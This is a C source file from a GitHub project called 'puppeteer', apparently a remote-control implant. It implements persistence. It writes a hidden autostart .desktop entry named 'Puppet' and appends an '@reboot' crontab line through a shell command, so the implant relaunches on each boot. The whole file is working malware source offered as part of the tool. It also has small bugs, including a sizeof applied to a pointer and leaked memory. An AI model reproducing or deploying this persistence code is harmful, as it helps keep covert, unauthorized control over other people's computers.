// MIT License
/*
 * This header file belongs to https://github.com/arthur-bryan/puppeteer
 *
 * Methods to maintain the control against the puppet
 *
 * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
 */
#include "../include/persistence.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>

#include "../include/footprint.h"
#include "../include/commands.h"

/*
 * Creates a autostart desktop entry on systems with graphical desktop env
 *
 * Parameters:
 *      const char *executable_path: path to the executable
 *
 * Returns:
 *      Returns 1 if the .desktop file was created, 0 otherwise
 */
uint8_t
create_desktop_autostart(const char *executable_path) {
    struct passwd   *user;
    char            *file_path;

    user = getpwuid(getuid());
    file_path = calloc(256, sizeof(char));
    file_path[sizeof file_path - 1] = '\0';
    snprintf(file_path, 256,
             "%s/.config/autostart/", user->pw_dir);
    if (!file_exists(file_path)) {
        return 0;
    }
    strcat(file_path, "puppeteer.desktop");
    if (!file_exists(file_path)) {
        FILE    *autorun_file;
        char    data[512] = { 0 };

        snprintf(data, sizeof data, "[Desktop Entry]\n"
                                    "Type=Application\n"
                                    "Name=Puppet\n"
                                    "NoDisplay=true\n"
                                    "Terminal=false\n"
                                    "Exec=/bin/sh -c %s\n",
                                    executable_path);
        autorun_file = fopen(file_path, "w");
        if (autorun_file == NULL) {
            return 0;
        }
        if (fwrite(data, sizeof(char), strlen(data), autorun_file) !=
            strlen(data)) {
            fclose(autorun_file);
            return 0;
        }
        fclose(autorun_file);
    }
    if (file_path != NULL) {
        free(file_path);
    }
    return 1;
}

/*
 * Creates cron job that runs the puppet executable some seconds after the
 * puppet boots up
 *
 * Parameters:
 *      const char *executable_path: path to the executable
 *
 * Returns:
 *      Returns 1 if the cron job was created, 0 otherwise
 */
uint8_t
create_cron_job(const char *executable_path) {
    char    create_cron_cmd[512];
    int16_t wait_time;

    memset(create_cron_cmd, 0, sizeof create_cron_cmd);
    wait_time = 40;
    snprintf(create_cron_cmd, sizeof create_cron_cmd,
             "crontab -l 2> /dev/null 1> current_crontab; "\
             "cat current_crontab | grep -v %s 1> new_crontab;"\
             " echo '@reboot sleep %hd && %s' >> new_crontab &&"\
             " crontab new_crontab &&"\
             " rm new_crontab current_crontab",
             executable_path, wait_time, executable_path);
    char    *command_output = execute_cmd(create_cron_cmd);

    if (strcmp("", command_output) != 0) {
        return 0;
    }
    free(command_output);
    return 1;
}

/*
 * Tries to create a autorun entry point using different methods. If a method
 * succeeds, the fuction returns to prevent creating multiple autoruns of the
 * same executable
 *
 * Parameters:
 *      const char *executable_path: path to the executable
 */
uint8_t
persistence(const char *executable_path) {
    if (create_cron_job(executable_path)) {
        return 1;
    }
    if (create_desktop_autostart(executable_path)) {
        return 1;
    }
    return 0;
}
